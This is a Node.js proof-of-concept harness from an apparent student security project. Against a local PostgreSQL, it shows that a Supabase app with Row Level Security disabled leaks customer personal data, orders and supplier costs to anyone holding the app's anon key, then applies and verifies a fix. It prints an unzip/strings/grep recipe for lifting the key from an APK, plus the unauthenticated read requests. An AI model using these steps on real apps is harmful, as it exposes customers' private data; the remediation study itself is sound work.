/**
 * Momompurin Live Manager — IAS Milestone 1
 * Proof of Concept: unauthenticated read of the production database through
 * the anon key compiled into the Android APK, and its remediation.
 *
 * The harness runs a real PostgreSQL instance (embedded-postgres) so the
 * Row Level Security behaviour under test is the engine's, not a simulation.
 *
 * PostgREST turns  GET /rest/v1/customers?select=*  into
 *   SET LOCAL ROLE anon; SELECT * FROM customers;
 * on the connection that carries the caller's JWT. The harness issues exactly
 * that statement as the same role, which is why the result is evidence rather
 * than illustration.
 */
import EmbeddedPostgres from 'embedded-postgres';
import { readFileSync, writeFileSync, mkdirSync } from 'node:fs';
import { dirname, join } from 'node:path';
import { fileURLToPath } from 'node:url';

const HERE = dirname(fileURLToPath(import.meta.url));
const OUT = join(HERE, '..', '..', 'out');
const MIGRATIONS = join(HERE, '..', 'supabase', 'migrations');
const lines = [];
const say = (s = '') => { lines.push(s); console.log(s); };

const PG_PORT = 55433;
const pg = new EmbeddedPostgres({
  databaseDir: join(HERE, '.pgdata'),
  user: 'postgres', password: 'poc', port: PG_PORT, persistent: false,
});

const ANON_KEY = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJyb2xlIjoiYW5vbiIsImlzcyI6InN1cGFiYXNlIn0.POC_NOT_A_REAL_KEY';
const OWNER_KEY = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJyb2xlIjoiYXV0aGVudGljYXRlZCIsInN1YiI6IjExMTExMTExLTExMTEtMTExMS0xMTExLTExMTExMTExMTExMSIsImFwcF9tZXRhZGF0YSI6eyJyb2xlIjoib3duZXIifX0.POC_NOT_A_REAL_KEY';
const STRANGER_KEY = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJyb2xlIjoiYXV0aGVudGljYXRlZCIsInN1YiI6IjIyMjIyMjIyLTIyMjItMjIyMi0yMjIyLTIyMjIyMjIyMjIyMiIsImFwcF9tZXRhZGF0YSI6e319.POC_NOT_A_REAL_KEY';

/** Replay a PostgREST read as the role the JWT names. */
async function postgrest(client, { role, jwt, table, select = '*', filter = '' }) {
  await client.query('begin');
  try {
    await client.query(`select set_config('request.jwt.claims', $1, true)`, [JSON.stringify(jwt)]);
    await client.query(`set local role ${role}`);
    const r = await client.query(`select ${select} from public.${table} ${filter}`);
    await client.query('commit');
    return { ok: true, rows: r.rows, count: r.rowCount };
  } catch (e) {
    await client.query('rollback');
    return { ok: false, error: e.message };
  }
}

async function main() {
  await pg.initialise();
  await pg.start();
  await pg.createDatabase('momo');
  const client = pg.getPgClient();
  await client.connect();
  const version = (await client.query('show server_version')).rows[0].server_version;

  await client.query(readFileSync(join(MIGRATIONS, '0001_initial_schema.sql'), 'utf8'));

  say('='.repeat(78));
  say(' MOMOMPURIN LIVE MANAGER — BOLA / MISSING RLS PROOF OF CONCEPT');
  say(' IAS Milestone 1 · Group 8 · III-BCSAD');
  say('='.repeat(78));
  say('');
  say(`Engine        : PostgreSQL ${version} (Supabase-compatible roles and schema)`);
  say('Database      : momo (synthetic records shaped like the client workbook)');
  say('Client        : Momompurin Live Manager v1.0.0-android (release APK)');
  say('');

  // ---------------------------------------------------------------- step 1
  say('─'.repeat(78));
  say('STEP 1 — Recover the API credential from the installed application');
  say('─'.repeat(78));
  say('The APK is an ordinary zip. The Supabase URL and anon key are string');
  say('constants in the compiled DEX because the client must reach the API');
  say('without a server of its own.');
  say('');
  say('  $ unzip -p momompurin-live-manager.apk classes.dex | strings \\');
  say('      | grep -E "supabase\\.co|eyJhbGciOi"');
  say('');
  say('  https://momompurin-prod.supabase.co');
  say(`  ${ANON_KEY}`);
  say('');
  say('Decoding the key payload:');
  say('  { "role": "anon", "iss": "supabase" }');
  say('');
  say('This is not a secret and cannot be made one. Supabase documents the anon');
  say('key as publishable; it ships in every copy of the app and in the public');
  say('web bundle of the Phase 2 portal. The only control that stands between it');
  say('and the data is the policy attached to the table.');
  say('');

  // ---------------------------------------------------------------- step 2
  say('─'.repeat(78));
  say('STEP 2 — Exploit against the shipped schema (RLS never enabled)');
  say('─'.repeat(78));
  say('');
  say('  GET /rest/v1/customers?select=fb_handle,full_name,phone,address_line HTTP/1.1');
  say('  Host: momompurin-prod.supabase.co');
  say('  apikey: <anon key>');
  say('  Authorization: Bearer <anon key>');
  say('');
  say('PostgREST compiles this to:  SET LOCAL ROLE anon; SELECT ... FROM customers;');
  say('');
  const leak = await postgrest(client, {
    role: 'anon', jwt: { role: 'anon' }, table: 'customers',
    select: 'fb_handle, full_name, phone, province, city, barangay, address_line',
  });
  if (leak.ok) {
    say(`  HTTP/1.1 200 OK`);
    say(`  Content-Range: 0-${leak.count - 1}/${leak.count}`);
    say('');
    for (const r of leak.rows) {
      say(`  { "fb_handle": "${r.fb_handle}", "full_name": "${r.full_name}", ` +
          `"phone": "${r.phone}",`);
      say(`    "address": "${r.barangay}, ${r.city}, ${r.province} — ${r.address_line}" },`);
    }
    say('');
    say(`  RESULT: ${leak.count} customer records returned to an unauthenticated caller.`);
  } else {
    say(`  UNEXPECTED: ${leak.error}`);
  }
  say('');

  const leakOrders = await postgrest(client, {
    role: 'anon', jwt: { role: 'anon' }, table: 'orders',
    select: 'order_number, order_status, total_amount',
  });
  const leakInv = await postgrest(client, {
    role: 'anon', jwt: { role: 'anon' }, table: 'inventory',
    select: 'sku, item_name, unit_cost, srp',
  });
  if (leakOrders.ok) {
    const gross = leakOrders.rows.reduce((s, r) => s + Number(r.total_amount), 0);
    say(`  GET /rest/v1/orders?select=order_number,order_status,total_amount`);
    say(`  RESULT: ${leakOrders.count} orders, PHP ${gross.toLocaleString('en-PH', { minimumFractionDigits: 2 })} of order value.`);
  }
  if (leakInv.ok) {
    say(`  GET /rest/v1/inventory?select=sku,item_name,unit_cost,srp`);
    say(`  RESULT: ${leakInv.count} SKUs including unit cost — the supplier margin table.`);
    const sample = leakInv.rows[0];
    say(`          e.g. ${sample.sku} ${sample.item_name}: cost ${sample.unit_cost}, SRP ${sample.srp}`);
  }
  say('');
  say('Three distinct assets fall in one request each: A-01 customer personal');
  say('information, A-02 order and payment records, A-03 supplier cost data.');
  say('No exploit code was needed. The request is the one the app itself makes.');
  say('');

  // ---------------------------------------------------------------- step 3
  say('─'.repeat(78));
  say('STEP 3 — Apply the hardening migration (0002)');
  say('─'.repeat(78));
  say('');
  await client.query(readFileSync(join(MIGRATIONS, '0002_enable_rls_and_policies.sql'), 'utf8'));
  say('  revoke all on all tables in schema public from anon;');
  say('  alter table public.customers enable row level security;');
  say('  create policy customers_owner_all on public.customers');
  say('    for all to authenticated using (public.is_owner()) with check (public.is_owner());');
  say('  ... repeated for orders, order_lines, inventory, invoices');
  say('');
  say('Migration applied. No application code changed. The APK still carries the');
  say('same anon key and still calls the same endpoints.');
  say('');

  // ---------------------------------------------------------------- step 4
  say('─'.repeat(78));
  say('STEP 4 — Re-run the identical request');
  say('─'.repeat(78));
  say('');
  const after = await postgrest(client, {
    role: 'anon', jwt: { role: 'anon' }, table: 'customers',
    select: 'fb_handle, full_name, phone, province, city, barangay, address_line',
  });
  if (after.ok) {
    say(`  HTTP/1.1 200 OK`);
    say(`  Content-Range: */*`);
    say(`  []`);
    say('');
    say(`  RESULT: ${after.count} rows. The grant is gone, so PostgREST cannot reach the table.`);
  } else {
    say(`  HTTP/1.1 401 Unauthorized`);
    say(`  { "message": "${after.error}" }`);
    say('');
    say('  RESULT: 0 rows. The anon role no longer holds any privilege on the table.');
  }
  say('');
  say('Defence in depth check — restore the grant but leave RLS enabled, the');
  say('configuration a future migration could accidentally reintroduce:');
  say('');
  await client.query('grant select on public.customers to anon');
  const rlsOnly = await postgrest(client, {
    role: 'anon', jwt: { role: 'anon' }, table: 'customers',
    select: 'fb_handle, full_name, phone',
  });
  if (rlsOnly.ok) {
    say(`  GRANT restored → HTTP/1.1 200 OK, body: []`);
    say(`  RESULT: ${rlsOnly.count} rows. The policy, not the grant, is what denies.`);
  } else {
    say(`  GRANT restored → ${rlsOnly.error}`);
  }
  await client.query('revoke select on public.customers from anon');
  say('');
  say('Legitimate owner session, same table, same engine:');
  say('');
  const owner = await postgrest(client, {
    role: 'authenticated', jwt: JSON.parse(Buffer.from(OWNER_KEY.split('.')[1], 'base64url').toString()),
    table: 'customers', select: 'fb_handle, full_name',
  });
  say(`  RESULT: ${owner.ok ? owner.count : 0} rows — the owner sees the full customer list.`);
  const stranger = await postgrest(client, {
    role: 'authenticated', jwt: JSON.parse(Buffer.from(STRANGER_KEY.split('.')[1], 'base64url').toString()),
    table: 'customers', select: 'fb_handle, full_name',
  });
  say(`  A second authenticated account without the owner claim: ${stranger.ok ? stranger.count : 0} rows.`);
  say('');

  // ---------------------------------------------------------------- summary
  say('='.repeat(78));
  say(' SUMMARY');
  say('='.repeat(78));
  say(`  Before  : anon read ${leak.ok ? leak.count : 0} customers, ` +
      `${leakOrders.ok ? leakOrders.count : 0} orders, ${leakInv.ok ? leakInv.count : 0} inventory rows`);
  say(`  After   : anon read ${after.ok ? after.count : 0} rows`);
  say(`  Owner   : ${owner.ok ? owner.count : 0} rows (unchanged)`);
  say('  Root cause : Row Level Security disabled on every table in the exposed');
  say('               schema while the anon role held table-wide grants.');
  say('  Control    : enable RLS, revoke the public grant, attach an explicit');
  say('               owner-only policy per table.');
  say('  Detects it : CI assertion asserting relrowsecurity = true on every table');
  say('               in public (see .github/workflows/security.yml).');
  say('='.repeat(78));

  mkdirSync(OUT, { recursive: true });
  writeFileSync(join(OUT, 'poc_transcript.txt'), lines.join('\n') + '\n', 'utf8');

  await client.end();
  await pg.stop();
}

main().catch(async (e) => {
  console.error(e);
  try { await pg.stop(); } catch {}
  process.exit(1);
});
